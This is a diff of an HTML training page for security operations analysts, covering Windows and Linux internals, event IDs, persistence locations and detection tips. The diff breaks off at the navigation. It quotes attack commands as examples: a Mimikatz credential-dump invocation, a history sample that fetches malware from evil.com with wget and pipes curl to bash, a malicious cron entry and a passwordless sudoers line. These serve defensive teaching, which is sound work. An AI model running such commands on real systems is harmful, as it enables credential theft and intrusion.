@@ -4,238 +4,572 @@
     <base href="/NikDet/">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Operating Systems | SOC Compendium</title>
+    <title>Operating Systems for SOC - Visual Guide | SOC Compendium</title>
     <link rel="stylesheet" href="css/styles.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .diagram-box { background: #0d1117; border-radius: 8px; padding: 1.5rem; margin: 1rem 0; font-family: 'Courier New', monospace; font-size: 0.75rem; overflow-x: auto; white-space: pre; color: #e6edf3; line-height: 1.4; }
+        .why-matters { background: rgba(251, 191, 36, 0.1); border-left: 4px solid #fbbf24; padding: 1rem 1.5rem; margin: 1.5rem 0; border-radius: 0 8px 8px 0; }
+        .why-matters h4 { margin: 0 0 0.5rem 0; color: #fbbf24; }
+        .attack-note { background: rgba(239, 68, 68, 0.1); border-left: 4px solid #ef4444; padding: 1rem 1.5rem; margin: 1.5rem 0; border-radius: 0 8px 8px 0; }
+        .attack-note h4 { margin: 0 0 0.5rem 0; color: #ef4444; }
+        .detection-tip { background: rgba(34, 197, 94, 0.1); border-left: 4px solid #22c55e; padding: 1rem 1.5rem; margin: 1.5rem 0; border-radius: 0 8px 8px 0; }
+        .detection-tip h4 { margin: 0 0 0.5rem 0; color: #22c55e; }
+        .key-insight { background: var(--bg-secondary); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; border: 1px solid var(--accent-primary); }
+        .os-section { background: var(--card-bg); border-radius: 12px; padding: 1.5rem; margin: 1.5rem 0; }
+    </style>
 </head>
 <body>
     <nav class="main-nav">
-        <a href="pages/foundations/index.html" class="nav-brand"><div class="brand-icon"><i class="fas fa-shield-halved"></i></div><div class="brand-text"><span class="brand-title">SOC Compendium</span><span class="brand-subtitle">Detection & Operations</span></div></a>
+        <a href="index.html" class="nav-brand"><div class="brand-icon"><i class="fas fa-shield-halved"></i></div><div class="brand-text"><span class="brand-title">SOC Compendium</span><span class="brand-subtitle">Detection & Operations</span></div></a>
     </nav>
     <main class="main-content">
         <div class="content-page">
-            <div class="breadcrumb"><a href="pages/foundations/index.html">Home</a><span class="separator">/</span><a href="pages/foundations/index.html">Foundations</a><span class="separator">/</span><span>Operating Systems</span></div>
-            <div class="content">
-                <h1>Operating Systems for Security Analysts</h1>
-                <p class="lead">Understanding Windows and Linux internals is critical for investigating security events. Most attacks target these operating systems.</p>
+            <div class="breadcrumb">
+                <a href="index.html">Home</a><span class="separator">/</span>
+                <a href="index.html">Foundations</a><span class="separator">/</span>
+                <span>Operating Systems</span>
+            </div>
 
-                <h2>Windows Fundamentals</h2>
-                
-                <h3>Windows Architecture</h3>
-                <table>
-                    <thead><tr><th>Component</th><th>What It Does</th><th>Security Relevance</th></tr></thead>
-                    <tbody>
-                        <tr><td><strong>Kernel (ntoskrnl.exe)</strong></td><td>Core OS, hardware access</td><td>Rootkits target this</td></tr>
-                        <tr><td><strong>User Mode</strong></td><td>Where applications run</td><td>Most malware operates here</td></tr>
-                        <tr><td><strong>Registry</strong></td><td>Configuration database</td><td>Persistence, malware settings</td></tr>
-                        <tr><td><strong>SAM</strong></td><td>Local account password hashes</td><td>Target for credential theft</td></tr>
-                        <tr><td><strong>LSASS</strong></td><td>Authentication, credentials in memory</td><td>Primary target for Mimikatz</td></tr>
-                        <tr><td><strong>Services</strong></td><td>Background processes</td><td>Persistence mechanism</td></tr>
-                        <tr><td><strong>WMI</strong></td><td>System management</td><td>Lateral movement, persistence</td></tr>
-                        <tr><td><strong>PowerShell</strong></td><td>Scripting/automation</td><td>Most popular attack tool</td></tr>
-                    </tbody>
-                </table>
+            <div class="content">
+                <h1><i class="fas fa-desktop"></i> Operating Systems for SOC Analysts</h1>
+                <p class="lead">Attackers exploit operating systems. To catch them, you need to understand how Windows and Linux work - not as a user, but as a defender. This guide shows you the internals through a security lens.</p>
+
+                <!-- ==================== WINDOWS SECTION ==================== -->
+                <h2><i class="fab fa-windows"></i> Windows Internals for Security</h2>
+
+                <div class="diagram-box">
+WINDOWS ARCHITECTURE - WHAT ATTACKERS TARGET
+═══════════════════════════════════════════════════════════════════════════════
+
+                    ┌─────────────────────────────────────────────────────────┐
+                    │                    USER MODE                            │
+                    │         (Where applications and malware run)            │
+                    │                                                         │
+                    │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐     │
+                    │  │ Your Apps   │  │ PowerShell  │  │  Malware    │     │
+                    │  │ (Word, etc) │  │ (T1059.001) │  │  lives here │     │
+                    │  └─────────────┘  └─────────────┘  └─────────────┘     │
+                    │         │                │                │             │
+                    │         └────────────────┼────────────────┘             │
+                    │                          │                              │
+                    │                          ▼                              │
+                    │  ┌─────────────────────────────────────────────────┐   │
+                    │  │              Windows API (Win32)                │   │
+                    │  │     CreateProcess, WriteFile, RegSetValue...    │   │
+                    │  └──────────────────────────┬──────────────────────┘   │
+                    │                             │                          │
+                    │  ┌──────────────────────────┼──────────────────────┐   │
+                    │  │         LSASS.exe        │                      │   │
+                    │  │  (Credentials in memory) │  🎯 MIMIKATZ TARGET  │   │
+                    │  └──────────────────────────┘                      │   │
+                    └─────────────────────────────┬───────────────────────────┘
+                                                  │
+════════════════════════════════════════════════════════════════════════════════
+                                                  │
+                    ┌─────────────────────────────┼───────────────────────────┐
+                    │                    KERNEL MODE                          │
+                    │         (Full system access - rootkits hide here)       │
+                    │                             │                           │
+                    │  ┌──────────────────────────▼──────────────────────┐   │
+                    │  │            ntoskrnl.exe (The Kernel)            │   │
+                    │  │     Process management, memory, security        │   │
+                    │  └─────────────────────────────────────────────────┘   │
+                    │                                                         │
+                    │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐     │
+                    │  │   Drivers   │  │     SAM     │  │  Registry   │     │
+                    │  │ (hw access) │  │  (password  │  │ (settings)  │     │
+                    │  │             │  │   hashes)   │  │             │     │
+                    │  └─────────────┘  └─────────────┘  └─────────────┘     │
+                    │        🎯              🎯               🎯              │
+                    │    Rootkits      Credential       Persistence          │
+                    │                    theft                                │
+                    └─────────────────────────────────────────────────────────┘
+
+
+KEY INSIGHT: Most attacks stay in User Mode. Kernel attacks are rare but devastating.
+                </div>
+
+                <h3>Critical Windows Components for Security</h3>
+
+                <div class="diagram-box">
+LSASS.EXE - THE CROWN JEWELS
+═══════════════════════════════════════════════════════════════════════════════
+
+What is LSASS?
+  Local Security Authority Subsystem Service
+  Handles all Windows authentication
+
+Why attackers LOVE it:
+  When you log in, your credentials are cached in LSASS memory!
+  
+  ┌─────────────────────────────────────────────────────────────────────────┐
+  │ LSASS.exe Memory Contents                                               │
+  │                                                                         │
+  │   User: john.doe                                                        │
+  │   NTLM Hash: aad3b435b51404eeaad3b435b51404ee:abc123...                │
+  │   Kerberos Tickets: TGT for domain access                              │
+  │   Clear-text password: (sometimes, depending on config)                │
+  │                                                                         │
+  │   🎯 MIMIKATZ can dump all of this!                                    │
+  └─────────────────────────────────────────────────────────────────────────┘
+
+
+Attack flow:
+  1. Attacker gets code execution
+  2. Runs: mimikatz.exe "sekurlsa::logonpasswords"
+  3. Mimikatz reads LSASS memory
+  4. Dumps all credentials → Attacker owns the domain
+
+
+DETECTION:
+─────────────────────────────────────────────────────────────────────────────
+EDR Alert: "LSASS memory access by non-system process"
+Sysmon Event 10: Process accessed lsass.exe
+
+If you see ANYTHING accessing LSASS that isn't a system process = INVESTIGATE!
+                </div>
+
+                <div class="diagram-box">
+THE WINDOWS REGISTRY - ATTACKER'S FAVORITE HIDING SPOT
+═══════════════════════════════════════════════════════════════════════════════
+
+What is it?
+  A hierarchical database storing ALL Windows configuration
+  
+Structure:
+  HKEY_LOCAL_MACHINE (HKLM)    ← System-wide settings
+  HKEY_CURRENT_USER (HKCU)     ← Current user settings
+  HKEY_USERS (HKU)             ← All user settings
+  HKEY_CLASSES_ROOT (HKCR)     ← File associations
+  HKEY_CURRENT_CONFIG (HKCC)   ← Hardware config
+
+
+PERSISTENCE LOCATIONS (Attackers put malware here):
+═══════════════════════════════════════════════════════════════════════════════
+
+RUN KEYS - Execute on every login:
+─────────────────────────────────────────────────────────────────────────────
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+Example malware entry:
+  Name: "WindowsUpdate"
+  Value: "C:\Users\Public\malware.exe"
+
+  Every time user logs in → malware.exe runs!
+
+
+SERVICES - Run as background processes:
+─────────────────────────────────────────────────────────────────────────────
+HKLM\SYSTEM\CurrentControlSet\Services\[ServiceName]
+
+Attackers create fake services that look legitimate:
+  "Windows Update Helper" → Actually runs malware
+
+
+DETECTION QUERIES:
+─────────────────────────────────────────────────────────────────────────────
+Look for:
+• New entries in Run keys
+• Services with unusual paths (not in System32)
+• Base64 or encoded commands in registry values
+• Event ID 4657: Registry value modified
+• Sysmon Event 13: Registry value set
+                </div>
+
+                <h3>Windows Event Logs - Your Evidence Trail</h3>
+
+                <div class="diagram-box">
+WINDOWS SECURITY EVENTS - THE MOST IMPORTANT IDs
+═══════════════════════════════════════════════════════════════════════════════
+
+AUTHENTICATION EVENTS:
+─────────────────────────────────────────────────────────────────────────────
+
+4624 - SUCCESSFUL LOGON
+       "Someone logged in"
+       
+       Key fields:
+       • Logon Type (see below)
+       • Source IP address
+       • Account name
+       • Workstation name
+       
+       Investigation: Who logged in, from where, what type?
+
+
+4625 - FAILED LOGON
+       "Someone tried and failed"
+       
+       Red flags:
+       • Many 4625 then 4624 = brute force SUCCESS
+       • Same password across users = password spray
+       • 4625 to admin accounts from unknown IPs
+       
+
+4648 - EXPLICIT CREDENTIAL LOGON
+       "Someone used credentials to authenticate"
+       
+       Red flags:
+       • Indicates Pass-the-Hash or runas
+       • If source ≠ normal workstation = lateral movement
+
+
+LOGON TYPES - MEMORIZE THESE:
+─────────────────────────────────────────────────────────────────────────────
+Type 2  = Interactive      (keyboard login)
+Type 3  = Network          (SMB, file share, remote)        ← Lateral movement!
+Type 4  = Batch            (scheduled task)
+Type 5  = Service          (service startup)
+Type 7  = Unlock           (unlock screen)
+Type 10 = RemoteInteractive (RDP)                           ← Remote access!
+Type 11 = CachedInteractive (cached credentials)
+
+
+PROCESS EVENTS:
+─────────────────────────────────────────────────────────────────────────────
+
+4688 - PROCESS CREATED
+       "A program ran"
+       
+       CRITICAL: Enable command line logging!
+       Without it, you just see "powershell.exe"
+       With it, you see "powershell.exe -enc [base64 payload]"
+       
+       Key fields:
+       • Process name
+       • Command line (if logging enabled)
+       • Parent process
+       • User who ran it
+
+
+PERSISTENCE EVENTS:
+─────────────────────────────────────────────────────────────────────────────
+
+4698 - SCHEDULED TASK CREATED
+       Attackers use tasks for persistence
+       
+       Red flags:
+       • Task running PowerShell or cmd
+       • Task pointing to temp folders
+       • Task created by non-admin user
+
+
+7045 - SERVICE INSTALLED (System log)
+       "New service was created"
+       
+       Red flags:
+       • Service binary in unusual location
+       • Service running as SYSTEM with odd name
+       • Service created around time of compromise
+
+
+PRIVILEGE EVENTS:
+─────────────────────────────────────────────────────────────────────────────
+
+4672 - SPECIAL PRIVILEGES ASSIGNED
+       "Admin logged in"
+       
+       Shows when privileged accounts are used
+       Correlate with 4624 to see admin access patterns
+
+
+4720 - USER ACCOUNT CREATED
+       Red flag if:
+       • Created by non-standard process
+       • Created at unusual time
+       • Name mimics legitimate account
+                </div>
+
+                <div class="attack-note">
+                    <h4>🔴 Attack Detection Pattern</h4>
+                    <p><strong>Brute Force Attack:</strong></p>
+                    <p>Look for: Multiple 4625 (failed) → Single 4624 (success) → 4672 (admin) from same source IP</p>
+                    <p><strong>Query logic:</strong> Count 4625 by source IP, if >5 in 5 minutes AND followed by 4624 = Alert!</p>
+                </div>
 
                 <h3>Critical Windows Folders</h3>
-                <table>
-                    <thead><tr><th>Path</th><th>Contents</th><th>Security Notes</th></tr></thead>
-                    <tbody>
-                        <tr><td><code>C:\Windows\System32</code></td><td>Core OS files</td><td>Malware may hide here, look for unusual files</td></tr>
-                        <tr><td><code>C:\Windows\Temp</code></td><td>Temporary files</td><td>Malware often drops files here</td></tr>
-                        <tr><td><code>C:\Users\[user]\AppData</code></td><td>User application data</td><td>Check Roaming, Local, LocalLow for malware</td></tr>
-                        <tr><td><code>C:\ProgramData</code></td><td>Shared application data</td><td>Persistence location</td></tr>
-                        <tr><td><code>C:\Windows\Prefetch</code></td><td>Execution optimization</td><td>Evidence of program execution</td></tr>
-                    </tbody>
-                </table>
 
-                <h3>Windows Event Logs</h3>
-                <p>Windows logs are your primary evidence source. Key logs to know:</p>
-                <table>
-                    <thead><tr><th>Log</th><th>Location</th><th>What It Records</th></tr></thead>
-                    <tbody>
-                        <tr><td><strong>Security</strong></td><td>Security.evtx</td><td>Logins, logoffs, privilege use, audit events</td></tr>
-                        <tr><td><strong>System</strong></td><td>System.evtx</td><td>Service starts/stops, driver loads</td></tr>
-                        <tr><td><strong>Application</strong></td><td>Application.evtx</td><td>Application errors and events</td></tr>
-                        <tr><td><strong>PowerShell</strong></td><td>PowerShell Operational</td><td>PowerShell commands executed</td></tr>
-                        <tr><td><strong>Sysmon</strong></td><td>Sysmon Operational</td><td>Detailed process/network/file activity</td></tr>
-                    </tbody>
-                </table>
+                <div class="diagram-box">
+WHERE ATTACKERS HIDE - FOLDER MAP
+═══════════════════════════════════════════════════════════════════════════════
 
-                <h3>Critical Windows Event IDs</h3>
-                <table>
-                    <thead><tr><th>Event ID</th><th>Source</th><th>Description</th><th>Why It Matters</th></tr></thead>
-                    <tbody>
-                        <tr><td><strong>4624</strong></td><td>Security</td><td>Successful logon</td><td>Track who accessed what, when</td></tr>
-                        <tr><td><strong>4625</strong></td><td>Security</td><td>Failed logon</td><td>Brute force, password spray</td></tr>
-                        <tr><td><strong>4648</strong></td><td>Security</td><td>Explicit credential logon</td><td>Pass-the-hash, lateral movement</td></tr>
-                        <tr><td><strong>4672</strong></td><td>Security</td><td>Admin logon</td><td>Privileged access</td></tr>
-                        <tr><td><strong>4688</strong></td><td>Security</td><td>Process created</td><td>Command execution (need cmd line logging)</td></tr>
-                        <tr><td><strong>4698</strong></td><td>Security</td><td>Scheduled task created</td><td>Persistence</td></tr>
-                        <tr><td><strong>4720</strong></td><td>Security</td><td>User account created</td><td>Unauthorized account creation</td></tr>
-                        <tr><td><strong>4732</strong></td><td>Security</td><td>User added to local group</td><td>Privilege escalation</td></tr>
-                        <tr><td><strong>7045</strong></td><td>System</td><td>Service installed</td><td>Persistence, lateral movement</td></tr>
-                    </tbody>
-                </table>
+C:\Windows\System32\
+├── Legitimate OS files
+├── 🎯 Attackers drop files here to blend in
+└── Look for: Files with recent modified dates, unusual names
 
-                <h3>Logon Types</h3>
-                <table>
-                    <thead><tr><th>Type</th><th>Name</th><th>Description</th><th>Example</th></tr></thead>
-                    <tbody>
-                        <tr><td>2</td><td>Interactive</td><td>Physical logon at keyboard</td><td>User logs in at their desk</td></tr>
-                        <tr><td>3</td><td>Network</td><td>Remote logon (no credentials cached)</td><td>Accessing file share</td></tr>
-                        <tr><td>4</td><td>Batch</td><td>Scheduled task execution</td><td>Scheduled job runs</td></tr>
-                        <tr><td>5</td><td>Service</td><td>Service account start</td><td>SQL Server service starts</td></tr>
-                        <tr><td>7</td><td>Unlock</td><td>Workstation unlocked</td><td>User returns from break</td></tr>
-                        <tr><td>10</td><td>RemoteInteractive</td><td>RDP session</td><td>Administrator RDPs in</td></tr>
-                        <tr><td>11</td><td>CachedInteractive</td><td>Cached credentials used</td><td>Laptop offline logon</td></tr>
-                    </tbody>
-                </table>
+C:\Windows\Temp\
+├── Temporary files (anyone can write here)
+├── 🎯 Malware LOVES this location
+└── Look for: Executables, scripts, recently created files
 
-                <h3>Essential Windows Commands for SOC</h3>
-                <div style="background: var(--bg-tertiary); padding: 1rem; border-radius: var(--radius-md); font-family: var(--font-mono); font-size: 0.7rem;">
-<pre style="margin: 0;"><span style="color: #6aa3f7;"># System information</span>
-systeminfo
-hostname
-whoami /all
+C:\Users\[user]\AppData\
+├── Local\     (app data that doesn't roam)
+├── LocalLow\  (low integrity apps)
+├── Roaming\   (syncs with profile)
+├── 🎯 Common malware drop location
+└── Look for: Hidden folders, executables, suspicious scripts
 
-<span style="color: #6aa3f7;"># Network</span>
-ipconfig /all
-netstat -ano
-arp -a
+C:\ProgramData\
+├── Shared application data
+├── 🎯 Persistence location
+└── Look for: Unusual folders, startup items
 
-<span style="color: #6aa3f7;"># Processes</span>
-tasklist
-tasklist /v
-wmic process get processid,name,commandline
+C:\Windows\Prefetch\
+├── Execution history! (.pf files)
+├── 🎯 Forensic goldmine
+└── Shows: What ran and when (even if deleted)
 
-<span style="color: #6aa3f7;"># Users and groups</span>
-net user
-net localgroup administrators
-net user [username]
 
-<span style="color: #6aa3f7;"># Services</span>
-sc query
-net start
+EXAMPLE INVESTIGATION:
+─────────────────────────────────────────────────────────────────────────────
 
-<span style="color: #6aa3f7;"># Scheduled tasks</span>
-schtasks /query /fo LIST /v
+Alert: "Suspicious PowerShell execution"
 
-<span style="color: #6aa3f7;"># Registry (persistence locations)</span>
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-
-<span style="color: #6aa3f7;"># File hashes</span>
-certutil -hashfile [file] SHA256
-
-<span style="color: #6aa3f7;"># PowerShell - Get running processes</span>
-Get-Process | Select-Object Name, Id, Path
-
-<span style="color: #6aa3f7;"># PowerShell - Network connections</span>
-Get-NetTCPConnection | Where-Object State -eq 'Established'</pre>
+Check these locations:
+1. C:\Windows\Prefetch\ → Was malware.exe ever run? (MALWARE.EXE-ABC123.pf)
+2. C:\Users\john\AppData\Local\Temp\ → Dropped files?
+3. C:\Windows\Temp\ → Any executables created around incident time?
+4. Registry Run keys → Did it establish persistence?
                 </div>
 
-                <h2>Linux Fundamentals</h2>
-                
-                <h3>Linux Directory Structure</h3>
-                <table>
-                    <thead><tr><th>Directory</th><th>Purpose</th><th>Security Notes</th></tr></thead>
-                    <tbody>
-                        <tr><td><code>/</code></td><td>Root directory</td><td>Everything starts here</td></tr>
-                        <tr><td><code>/etc</code></td><td>Configuration files</td><td>passwd, shadow, hosts, crontab</td></tr>
-                        <tr><td><code>/var/log</code></td><td>Log files</td><td>Primary investigation source</td></tr>
-                        <tr><td><code>/home</code></td><td>User home directories</td><td>User data, .bash_history</td></tr>
-                        <tr><td><code>/tmp</code></td><td>Temporary files</td><td>Malware staging area</td></tr>
-                        <tr><td><code>/bin, /sbin</code></td><td>Essential binaries</td><td>System commands</td></tr>
-                        <tr><td><code>/root</code></td><td>Root user home</td><td>Root's files and history</td></tr>
-                        <tr><td><code>/proc</code></td><td>Process information</td><td>Live process data</td></tr>
-                    </tbody>
-                </table>
+                <!-- ==================== LINUX SECTION ==================== -->
+                <h2><i class="fab fa-linux"></i> Linux Internals for Security</h2>
 
-                <h3>Linux Log Files</h3>
-                <table>
-                    <thead><tr><th>Log</th><th>Location</th><th>Contents</th></tr></thead>
-                    <tbody>
-                        <tr><td><strong>auth.log / secure</strong></td><td>/var/log/auth.log (Debian) /var/log/secure (RHEL)</td><td>Authentication events</td></tr>
-                        <tr><td><strong>syslog / messages</strong></td><td>/var/log/syslog or /var/log/messages</td><td>General system messages</td></tr>
-                        <tr><td><strong>cron</strong></td><td>/var/log/cron</td><td>Scheduled job execution</td></tr>
-                        <tr><td><strong>lastlog</strong></td><td>/var/log/lastlog</td><td>Last login for each user</td></tr>
-                        <tr><td><strong>wtmp</strong></td><td>/var/log/wtmp</td><td>Login/logout history (use 'last' command)</td></tr>
-                        <tr><td><strong>btmp</strong></td><td>/var/log/btmp</td><td>Failed login attempts (use 'lastb' command)</td></tr>
-                    </tbody>
-                </table>
+                <div class="diagram-box">
+LINUX ARCHITECTURE - SECURITY VIEW
+═══════════════════════════════════════════════════════════════════════════════
 
-                <h3>Essential Linux Commands for SOC</h3>
-                <div style="background: var(--bg-tertiary); padding: 1rem; border-radius: var(--radius-md); font-family: var(--font-mono); font-size: 0.7rem;">
-<pre style="margin: 0;"><span style="color: #6aa3f7;"># System info</span>
-uname -a
-hostname
-whoami
-id
-
-<span style="color: #6aa3f7;"># Network</span>
-ip a
-netstat -tulpn
-ss -tulpn
-lsof -i
-
-<span style="color: #6aa3f7;"># Processes</span>
-ps aux
-ps -ef
-top
-htop
-
-<span style="color: #6aa3f7;"># Users</span>
-cat /etc/passwd
-cat /etc/shadow  # requires root
-last             # login history
-lastb            # failed logins
-w                # who's logged in now
-
-<span style="color: #6aa3f7;"># Cron jobs (persistence)</span>
-crontab -l
-cat /etc/crontab
-ls -la /etc/cron.*
-
-<span style="color: #6aa3f7;"># Services</span>
-systemctl list-units --type=service
-service --status-all
-
-<span style="color: #6aa3f7;"># Files</span>
-find / -name "filename" 2>/dev/null
-find / -mtime -1   # modified in last day
-ls -la /tmp
-
-<span style="color: #6aa3f7;"># Log analysis</span>
-grep "Failed" /var/log/auth.log
-tail -f /var/log/syslog
-journalctl -xe
-
-<span style="color: #6aa3f7;"># File hashes</span>
-md5sum [file]
-sha256sum [file]
-
-<span style="color: #6aa3f7;"># Command history</span>
-cat ~/.bash_history
-history</pre>
+                    ┌─────────────────────────────────────────────────────────┐
+                    │                     USER SPACE                          │
+                    │                                                         │
+                    │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐     │
+                    │  │   Users     │  │  Services   │  │   Malware   │     │
+                    │  │  (bash,etc) │  │ (web,ssh)   │  │             │     │
+                    │  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘     │
+                    │         │                │                │             │
+                    │         └────────────────┼────────────────┘             │
+                    │                          │                              │
+                    │                          ▼                              │
+                    │  ┌─────────────────────────────────────────────────┐   │
+                    │  │              System Calls (syscalls)            │   │
+                    │  │        open(), read(), write(), exec()...       │   │
+                    │  └──────────────────────────┬──────────────────────┘   │
+                    └─────────────────────────────┬───────────────────────────┘
+                                                  │
+════════════════════════════════════════════════════════════════════════════════
+                                                  │
+                    ┌─────────────────────────────┼───────────────────────────┐
+                    │                     KERNEL SPACE                        │
+                    │                                                         │
+                    │  ┌──────────────────────────▼──────────────────────┐   │
+                    │  │                 Linux Kernel                    │   │
+                    │  │   Process scheduling, memory, file systems      │   │
+                    │  └─────────────────────────────────────────────────┘   │
+                    │                                                         │
+                    │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐     │
+                    │  │  /etc/shadow│  │  /etc/passwd│  │ Kernel      │     │
+                    │  │  (password  │  │   (users)   │  │ Modules     │     │
+                    │  │   hashes)   │  │             │  │ (rootkits)  │     │
+                    │  └─────────────┘  └─────────────┘  └─────────────┘     │
+                    │        🎯               🎯               🎯             │
+                    │   Credential        User enum       Kernel malware     │
+                    │     theft                                              │
+                    └─────────────────────────────────────────────────────────┘
                 </div>
 
-                <h3>Linux Persistence Locations</h3>
-                <table>
-                    <thead><tr><th>Location</th><th>Description</th></tr></thead>
-                    <tbody>
-                        <tr><td><code>/etc/crontab, /etc/cron.*</code></td><td>Scheduled tasks</td></tr>
-                        <tr><td><code>/etc/rc.local</code></td><td>Run at boot</td></tr>
-                        <tr><td><code>/etc/init.d/</code></td><td>Init scripts</td></tr>
-                        <tr><td><code>/etc/systemd/system/</code></td><td>Systemd services</td></tr>
-                        <tr><td><code>~/.bashrc, ~/.profile</code></td><td>User shell startup</td></tr>
-                        <tr><td><code>/etc/passwd</code></td><td>User accounts (check for unauthorized)</td></tr>
-                        <tr><td><code>~/.ssh/authorized_keys</code></td><td>SSH key access</td></tr>
-                    </tbody>
-                </table>
+                <h3>Linux Security Files</h3>
 
-                <div class="nav-buttons" style="display: flex; justify-content: space-between; margin-top: 2rem;">
-                    <a href="pages/foundations/networking-basics.html" class="btn btn-secondary"><i class="fas fa-arrow-left"></i> Networking Basics</a>
-                    <a href="pages/foundations/attack-basics.html" class="btn btn-primary">Next: How Attacks Work <i class="fas fa-arrow-right"></i></a>
+                <div class="diagram-box">
+CRITICAL LINUX FILES - WHAT ATTACKERS TARGET
+═══════════════════════════════════════════════════════════════════════════════
+
+AUTHENTICATION FILES:
+─────────────────────────────────────────────────────────────────────────────
+
+/etc/passwd - User accounts (readable by everyone)
+  root:x:0:0:root:/root:/bin/bash
+  john:x:1000:1000:John:/home/john:/bin/bash
+        │ │
+        │ └── x means password is in /etc/shadow
+        └──── UID (0 = root!)
+
+  🎯 Attackers: Add user with UID 0 = instant root access!
+  Detection: Monitor for new entries, UID 0 accounts
+
+
+/etc/shadow - Password hashes (root only)
+  root:$6$salt$hash...:18000:0:99999:7:::
+  
+  🎯 Attackers: Dump and crack offline
+  Detection: Any read access by non-root process
+
+
+/etc/sudoers - Who can become root
+  john ALL=(ALL) NOPASSWD: ALL    ← No password needed!
+  
+  🎯 Attackers: Add entry for persistence
+  Detection: File modification monitoring
+
+
+SSH FILES:
+─────────────────────────────────────────────────────────────────────────────
+
+~/.ssh/authorized_keys - Who can SSH in
+  ssh-rsa AAAA...key... user@host
+  
+  🎯 Attackers: Add their public key = permanent access
+  Detection: New keys added, especially to root
+
+
+/etc/ssh/sshd_config - SSH server config
+  PermitRootLogin yes     ← Bad!
+  PasswordAuthentication yes
+  
+  🎯 Attackers: Enable root login, weaken security
+
+
+CRON (Scheduled Tasks):
+─────────────────────────────────────────────────────────────────────────────
+
+/etc/crontab - System cron
+/etc/cron.d/* - System cron drop-in
+/var/spool/cron/crontabs/[user] - User crons
+
+  * * * * * /tmp/malware.sh    ← Runs every minute!
+  
+  🎯 Attackers: Add cron job for persistence
+  Detection: New cron entries, especially running from /tmp
+                </div>
+
+                <h3>Linux Logs</h3>
+
+                <div class="diagram-box">
+LINUX LOGS - WHERE TO LOOK
+═══════════════════════════════════════════════════════════════════════════════
+
+AUTHENTICATION:
+─────────────────────────────────────────────────────────────────────────────
+
+/var/log/auth.log (Debian/Ubuntu)
+/var/log/secure (RHEL/CentOS)
+
+  Jan  4 10:15:23 server sshd[1234]: Accepted password for john from 10.1.1.50
+  Jan  4 10:15:24 server sshd[1234]: Failed password for root from 185.220.101.34
+
+  Key patterns:
+  • "Failed password" - failed login attempts
+  • "Accepted password" - successful logins  
+  • "Invalid user" - username that doesn't exist
+  • Multiple failures + success = brute force
+
+
+COMMAND HISTORY:
+─────────────────────────────────────────────────────────────────────────────
+
+~/.bash_history - Commands user ran
+
+  🎯 Attackers often: unset HISTFILE or rm ~/.bash_history
+  Detection: Missing history file is suspicious!
+
+  Common attack commands in history:
+  • wget http://evil.com/malware.sh
+  • curl | bash
+  • chmod +x /tmp/*
+  • cat /etc/shadow
+
+
+SYSTEM LOGS:
+─────────────────────────────────────────────────────────────────────────────
+
+/var/log/syslog - General system log
+/var/log/messages - General messages
+/var/log/kern.log - Kernel messages
+
+  Look for:
+  • Kernel module loads (rootkits)
+  • Out-of-memory killers (cryptominers)
+  • Segfaults (exploit attempts)
+                </div>
+
+                <div class="detection-tip">
+                    <h4>🔍 Quick Linux Investigation Checklist</h4>
+                    <ul>
+                        <li><code>last</code> - Who logged in recently?</li>
+                        <li><code>w</code> - Who's logged in now?</li>
+                        <li><code>ps auxf</code> - What's running?</li>
+                        <li><code>netstat -tulpn</code> - What's listening?</li>
+                        <li><code>crontab -l</code> - What's scheduled?</li>
+                        <li><code>cat /etc/passwd</code> - Any new users?</li>
+                        <li><code>find /tmp -type f -executable</code> - Executables in /tmp?</li>
+                    </ul>
+                </div>
+
+                <!-- ==================== COMPARISON ==================== -->
+                <h2><i class="fas fa-balance-scale"></i> Windows vs Linux - Quick Reference</h2>
+
+                <div class="diagram-box">
+SECURITY COMPARISON - WINDOWS vs LINUX
+═══════════════════════════════════════════════════════════════════════════════
+
+CONCEPT              WINDOWS                     LINUX
+─────────────────────────────────────────────────────────────────────────────
+Credentials          LSASS.exe memory            /etc/shadow
+                     SAM database                /etc/passwd
+
+Persistence          Registry Run keys           Cron jobs
+                     Scheduled Tasks             Systemd services
+                     Services                    ~/.bashrc, init scripts
+
+Authentication       Event ID 4624/4625          /var/log/auth.log
+Logs                 Security.evtx               /var/log/secure
+
+Remote Access        RDP (3389)                  SSH (22)
+                     WinRM (5985/5986)           
+
+Admin Account        Administrator               root (UID 0)
+                     SYSTEM                      
+
+Privilege            RunAs, UAC bypass           sudo, SUID binaries
+Escalation           Token manipulation          Kernel exploits
+
+Process Logging      Event 4688 (if enabled)     auditd
+                     Sysmon                      syslog
+
+Common Attacks       Mimikatz, PowerShell        SSH brute force
+                     PsExec, WMI                 Cron persistence
+                                                 Web shell on servers
+                </div>
+
+                <!-- ==================== KEY TAKEAWAYS ==================== -->
+                <h2><i class="fas fa-graduation-cap"></i> Key Takeaways</h2>
+
+                <div class="key-insight">
+                    <h4>What to Remember</h4>
+                    <table>
+                        <thead>
+                            <tr><th>Topic</th><th>Key Point</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr><td><strong>LSASS</strong></td><td>Contains credentials - any access by non-system = investigate</td></tr>
+                            <tr><td><strong>Registry Run keys</strong></td><td>Common persistence - monitor for changes</td></tr>
+                            <tr><td><strong>Event 4624/4625</strong></td><td>Authentication tracking - correlate for brute force</td></tr>
+                            <tr><td><strong>Logon Type 3</strong></td><td>Network logon = potential lateral movement</td></tr>
+                            <tr><td><strong>/etc/shadow</strong></td><td>Linux password hashes - protect and monitor access</td></tr>
+                            <tr><td><strong>authorized_keys</strong></td><td>SSH persistence - attackers add their keys</td></tr>
+                            <tr><td><strong>Prefetch</strong></td><td>Windows execution evidence - even if malware deleted</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <!-- Navigation -->
+                <div class="card-grid">
